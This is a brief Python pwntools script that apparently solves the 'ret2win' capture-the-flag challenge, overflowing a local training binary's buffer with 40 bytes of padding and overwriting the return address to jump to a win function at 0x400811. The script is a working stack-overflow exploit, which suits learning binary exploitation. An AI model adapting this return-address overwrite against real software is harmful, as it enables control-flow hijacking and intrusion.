#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *

elf = ELF("./ret2win")
sh = process("./ret2win")

ret2win = 0x400811

payload = ""
payload += "A"*40
payload += p64(ret2win)

sh.sendline(payload)
sh.interactive()